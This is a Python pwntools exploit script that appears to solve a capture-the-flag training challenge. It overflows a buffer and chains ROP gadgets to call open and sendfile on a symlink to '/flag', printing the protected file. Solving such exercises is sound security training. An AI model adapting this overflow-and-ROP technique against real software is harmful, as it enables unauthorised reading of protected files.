from pwn import *


challenge_name = '/challenge/babyrop_level6.1'
buf_size = 0x48 
open_addr = 0x401100
sendfile_addr = 0x4010e0
leaving_addr = 0x402004



#### CREATE SYMBOLIK LINK LEAVING

p = process(["ln", '-s', '/flag', 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

###############################################3


elf = ELF(challenge_name) 
rop = ROP(elf)             

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]  
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]  
pop_rcx = rop.find_gadget(['pop rcx', 'ret'])[0]  

p = process([challenge_name])


payload = buf_size * b'A'


##### OPEN ###########

payload += p64(pop_rdi)
payload += p64(leaving_addr)  

payload += p64(pop_rsi)
payload += p64(0)

payload += p64(open_addr)

#### SENDFILE ##########

payload += p64(pop_rdi)
payload += p64(1)    
payload += p64(pop_rsi)
payload += p64(3)   
payload += p64(pop_rdx)
payload += p64(0)     
payload += p64(pop_rcx)
payload += p64(100)

payload += p64(sendfile_addr)

################################

p.send(payload)

answer = p.clean()
print(answer.decode(errors='ignore'))


#############################################

p = process(["/usr/bin/cat", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

p = process(["rm", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))